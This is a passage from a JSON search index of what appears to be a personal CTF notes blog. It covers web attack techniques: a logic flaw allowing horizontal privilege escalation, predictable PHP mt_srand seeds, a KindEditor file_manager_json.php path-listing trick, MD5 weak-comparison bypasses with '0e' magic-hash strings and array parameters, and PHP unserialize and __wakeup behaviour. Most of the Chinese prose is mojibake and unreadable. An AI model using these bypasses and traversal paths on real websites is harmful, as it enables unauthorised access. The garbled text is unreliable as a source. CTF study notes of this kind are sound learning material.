‡ç”¨æˆ·çš„ä¿¡æ¯ä¹Ÿè¿”å›å›æ¥?\n\nå½“ç™»é™†æ—¶ä½¿ç”¨adminä¸è‡ªå®šä¹‰å¯†ç ç™»é™†ï¼Œæ•°æ®åº“å°†è¿”å›æˆ‘ä»¬è‡ªå·±æ³¨å†Œçš„è´¦æˆ·ä¿¡æ¯ï¼Œä½†æ˜¯æ³¨æ„æ­¤å¤„çš„return $usernameï¼Œè™½ç„¶æ­¤æ—¶æŸ¥è¯¢å‡ºæ¥çš„æ˜¯æˆ‘ä»¬è‡ªå·±çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä½†æ˜¯è¿”å›çš„ç”¨æˆ·ååˆ™æ˜¯ç›®æ ‡çš„ç”¨æˆ·åã€‚å¦‚æœæ­¤åçš„ä¸šåŠ¡é€»è¾‘ç›´æ¥ä»¥è¯¥ç”¨æˆ·åä¸ºå‡†ï¼Œåˆ™æˆ‘ä»¬å°±è¾¾åˆ°äº†æ°´å¹³è¶Šæƒçš„ç›®çš„ã€‚\n","tags":["Note","web","SQL"]},{"title":"CTFé›¶ç¢ç¬”è®°","url":"/2022/01/08/CTFé›¶ç¢ç¬”è®°/","content":"\n# é›¶ç¢ç¬”è®°\n\nmt_srand( )è¯¥å‡½æ•°åœ¨PHP4.2.0ä¹‹å‰ä¼ å…¥ä»»æ„å‚æ•°åç”Ÿæˆçš„éƒ½æ˜¯ä¼ªéšæœºæ•°ï¼Œåœ¨ä»»ä½•æœºå™¨ä¸Šåªè¦è¿è¡Œçš„åŒæ ·çš„seedå‚æ•°ç»“æœéƒ½ç›¸åŒ\n\n<!--more-->\n\nKindEditorç¼–è¾‘å™¨æ¼æ´ï¼Œåœ¨ä½¿ç”¨è¯¥ç¼–è¾‘å™¨æ˜¯åœ¨urlæœ«å°¾åŠ ä¸Š/php/file_manager_json.php?path=è·¯å¾„ï¼Œå°±ä¼šä¾¿åˆ©è·¯å¾„ä¸­æ‰€æœ‰å†…å®¹ï¼Œç‰¹å¾ä¸ºå‰ç«¯ä»£ç ä¸­æœ‰å¯¹php/file_manager_json.phpçš„å¼•ç”¨\n\n###### md5å¼±ç›¸ç­‰ç»•è¿‡ï¼š\n\n1ã€æ„é€ æ•°ç»„a[]=xxxx&b[]=xxxx\n\n2ã€å¼±ç›¸ç­‰æ—¶è½¬æ¢ä¸ºç›¸åŒæ•°æ®ç±»å‹ï¼Œ0eå¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«è½¬ä¸º0ï¼Œå­—ç¬¦ä¸²å¦‚ä¸‹\n\n```\nQNKCDZO//0e830400451993494058024219903391\ns878926199a//0e545993274517709034328855841020\ns155964671a//0e342768416822451524974117254469\ns214587387a//0e848240448830537924465865611904\ns214587387a//0e848240448830537924465865611904\ns878926199a//0e545993274517709034328855841020\ns1091221200a//0e940624217856561557816327384675\n```\n\n\n\n## åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼š\n\n#### åºåˆ—åŒ–ï¼š\n\nå°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–ä¸ºä¸€ä¸ªæœ‰åºçš„å­—ç¬¦ä¸²\n\n#### åºåˆ—åŒ–æ ¼å¼ï¼š\n\nç»“æ„ç±»å‹:\n\n```php\nå¯¹è±¡åé•¿åº¦:\"å¯¹è±¡å\":ç±»ä¸­é¡¹ç›®æ•°é‡:{é¡¹ç›®1ç±»å‹:é¡¹ç›®1é•¿åº¦:â€é¡¹ç›®1å†…å®¹â€;é¡¹ç›®2ç±»å‹:é¡¹ç›®2é•¿åº¦:â€é¡¹ç›®2å†…å®¹â€;} \n```\n\nä¾‹å­ï¼š\n\n```php\nO:4:\"xctf\":2:{s:4:\"flag\";s:3:\"111\";}\n//Oä»£è¡¨å¯¹è±¡ç±»å‹ï¼Œsä»£è¡¨å­—ç¬¦ä¸²ç±»å‹\n```\n\n#### åºåˆ—åŒ–æœ‰å…³å‡½æ•°ï¼š\n\n```php\nserialize(å¯¹è±¡)//å°†å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²\n```\n\n```php\nunserialize(å­—ç¬¦ä¸²)//å°†å¯¹åº”å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œè¿”å›ä¸€ä¸ªç±»\n```\n\n```php\n__wakeup()//è¯¥å‡½æ•°ä¸ºç±»å†…å‡½æ•°ï¼Œå¦‚æœåºåˆ—åŒ–ä¸­å¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸæ˜¯ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡è¯¥å‡½æ•°æ‰§è¡Œ\t\n```\n\n","tags":["Note","web"]},{"title":"CTF","url":"/2022/01/08/CTF/","content":"\nJlançš„CTFä¹‹æ—…ä»ç°åœ¨å¼€å§‹äº†\n","tags":["Note"]}]